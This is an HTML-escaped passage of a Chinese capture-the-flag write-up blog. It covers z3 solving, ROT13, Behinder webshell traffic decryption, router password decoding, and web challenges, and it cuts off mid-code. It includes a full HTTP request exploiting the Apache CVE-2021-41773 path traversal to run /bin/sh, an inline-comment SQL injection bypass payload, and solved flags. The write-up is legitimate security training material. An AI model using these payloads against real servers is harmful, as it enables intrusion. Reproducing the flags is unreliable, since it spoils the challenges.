class=&#34;number&#34;&gt;0x2D3803F3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * (v8 &amp;amp; &lt;span class=&#34;number&#34;&gt;0x2D3803F3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     - -&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * (v8 | &lt;span class=&#34;number&#34;&gt;0x2D3803F3&lt;/span&gt;) == -&lt;span class=&#34;number&#34;&gt;837785892&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(s.check())&lt;span class=&#34;comment&#34;&gt;#check是保证有解&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;answer=s.model()&lt;span class=&#34;comment&#34;&gt;#model是输出运算结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(answer)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data=[&lt;span class=&#34;number&#34;&gt;3821413212&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;98124621&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;78769651&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;67321987&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#123;&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08x-&amp;#x27;&lt;/span&gt;%data[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08x-&amp;#x27;&lt;/span&gt;%data[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08x-&amp;#x27;&lt;/span&gt;%data[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08x&amp;#x27;&lt;/span&gt;%data[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]+&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#125;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#flag&amp;#123;e3c6235c-05d9434d-04b1edf3-04034083&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;misc-签到&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc-签到&#34;&gt;#&lt;/a&gt; Misc - 签到&lt;/h2&gt;
&lt;p&gt;一张 GIF 图，拖到 pr 里面一帧一帧看，第一帧是：Flag is the ROT13 of …&lt;br&gt;
 之后的每一帧合并起来就是：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;synt&amp;#123;jrypbzr-gb-pbzcrgvgvba&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后通过 ROT13 解密，得到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;welcome-to-competition&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;misc-easyshell复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc-easyshell复现&#34;&gt;#&lt;/a&gt; Misc-easyshell（复现）&lt;/h2&gt;
&lt;p&gt;冰蝎这个 webShell 的流量分析，推测是冰蝎 3.0，使用默认密码 rebeyond 的 md5 加密然后取前 16 位作为 key 进行 AES 解密，或者直接通过 （ &lt;a href=&#34;https://github.com/melody27/behinder_decrypt&#34;&gt;https://github.com/melody27/behinder_decrypt&lt;/a&gt; ）  进行解密：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 py_decrypt.py -f easyshell.pcap | tee result&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获得相应的请求和响应的内容。&lt;br&gt;
通过如下两个命令分别提取文件的信息：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat result | grep &amp;#123;\&amp;quot;msg\&amp;quot;:\&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat result | grep $mode=\&amp;quot;ZG93bmxvYWRQYXJ0\&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之后能够获取到一个压缩包，之后通过创建一个 CRC 值与获取的压缩包 CRC 值相同的 zip 包，然后进行明文攻击，最后获得 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;70854278-ea0c-462e-bc18-468c7a04a505&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;misc-gateway复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc-gateway复现&#34;&gt;#&lt;/a&gt; Misc-Gateway（复现）&lt;/h2&gt;
&lt;p&gt;在附件 baseinfoSet.json 中有个 “baseinfoSet_TELECOMPASSWORD”: “106&amp;amp;112&amp;amp;101&amp;amp;107&amp;amp;127&amp;amp;101&amp;amp;104&amp;amp;49&amp;amp;57&amp;amp;56&amp;amp;53&amp;amp;56&amp;amp;54&amp;amp;56&amp;amp;49&amp;amp;51&amp;amp;51&amp;amp;105&amp;amp;56&amp;amp;103&amp;amp;106&amp;amp;49&amp;amp;56&amp;amp;50&amp;amp;5 6&amp;amp;103&amp;amp;102&amp;amp;56&amp;amp;52&amp;amp;101&amp;amp;104&amp;amp;102&amp;amp;105&amp;amp;53&amp;amp;101&amp;amp;53&amp;amp;102&amp;amp;129&amp;amp;”,&lt;br&gt;
 在网上搜索 baseinfoSet_TELECOMPASSWORD   存在解密脚本，直接解密得到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;ad1985868133e8cf1828cb84adbe5a5b&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;code=&amp;#x27;106&amp;amp;112&amp;amp;101&amp;amp;107&amp;amp;127&amp;amp;101&amp;amp;104&amp;amp;49&amp;amp;57&amp;amp;56&amp;amp;53&amp;amp;56&amp;amp;54&amp;amp;56&amp;amp;49&amp;amp;51&amp;amp;51&amp;amp;105&amp;amp;56&amp;amp;103&amp;amp;106&amp;amp;49&amp;amp;56&amp;amp;50&amp;amp;56&amp;amp;103&amp;amp;102&amp;amp;56&amp;amp;52&amp;amp;101&amp;amp;104&amp;amp;102&amp;amp;105&amp;amp;53&amp;amp;101&amp;amp;53&amp;amp;102&amp;amp;129&amp;amp;&amp;#x27;[:-1]    # &amp;quot;baseinfoSet_TELECOMPASSWORD&amp;quot;:&amp;quot;114&amp;amp;73&amp;amp;55&amp;amp;110&amp;amp;69&amp;amp;37&amp;amp;53&amp;amp;113&amp;amp;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list=map(int,code.split(&amp;#x27;&amp;amp;&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in list:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if i &amp;gt; 57:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       i-=4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result.append(chr(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print (&amp;#x27;&amp;#x27;.join(result))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;misc-apache复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc-apache复现&#34;&gt;#&lt;/a&gt; Misc-Apache（复现）&lt;/h2&gt;
&lt;p&gt;在博客里直接搜索 httpd:2.4.49-buster 漏洞  可知，有个 CVE-2021-41773 的路径穿越漏洞，相关连接如下&lt;a href=&#34;https://blog.csdn.net/qq_59975439/article/details/125225949&#34;&gt; Apache HTTP Server 路径穿越漏洞复现 (CVE-2021-41773)-CSDN 博客&lt;/a&gt;&lt;br&gt;
所以根据 python 的源码，构造如下的包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /nc HTTP/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: prob01-8k743yxw.contest.pku.edu.cn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 470&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;port&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;data&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: aaaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: curl/7.68.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo Content-Type:text/plain; echo; cat /flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary7MA4YWxkTrZu0gW--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 burp 发包得到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;wHaTaaPaCheRcE&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;web-phpsql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web-phpsql&#34;&gt;#&lt;/a&gt; Web-phpsql&lt;/h2&gt;
&lt;p&gt;题目开始是个登陆框，根据题目，应该是个 sql 注入，先注册账号，然后登陆注册的账号看看情况，出现一个弹窗，表示只有 admin 才能拿到一些内容，那么猜测应该是万能密码登陆 admin 账号。&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/2f4ae7a99b08a15aa92c69ac1f4e3e9b.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 当 payload 为  1’ or 1=1 #  的时候，回显是 hacker，多次尝试之后，发现只过滤了空格，内联注释绕过，构造 payload 为：1’/&lt;strong&gt;/Or/&lt;/strong&gt;/1/&lt;strong&gt;/like/&lt;/strong&gt;/1/**/# 成功绕过，在经过两次离谱的弹窗之后，成功拿到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;KTFoYJlPMrqDW6fBGwGG&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;web-pyssrf复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web-pyssrf复现&#34;&gt;#&lt;/a&gt; Web-pyssrf（复现）&lt;/h2&gt;
&lt;p&gt;访问 source 路由，拿到 python 源码&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Flask,request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; redis &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Redis&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; urllib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis = Redis(host=&lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;, port=&lt;span class=&#34;number&#34;&gt;6379&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_result&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url_key=hashlib.md5(url.encode()).hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res=redis.get(url_key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; res:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; pickle.loads(base64.b64decode(res))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            info = urllib.request.urlopen(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            res = info.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pickres=pickle.dumps(res)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            b64res=base64.b64encode(pickres)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            redis.&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(url_key,b64res,ex=&lt;span class=&#34;number&#34;&gt;300&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; res&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; urllib.error.URLError &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(e)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;hello&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&amp;lt;h1&amp;gt;give me your url via GET method like: ?url=127.0.0.1:8080&amp;lt;h1&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;lt;h2&amp;gt;Here is your result&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;lt;h3&amp;gt;source code in /source&amp;lt;/h3&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    %s&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt; % get_result(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://&amp;#x27;&lt;/span&gt;+url).decode(encoding=&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf8&amp;#x27;&lt;/span&gt;,errors=&lt;span class=&#34;string&#34;&gt;&amp;#x27;ignore&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span 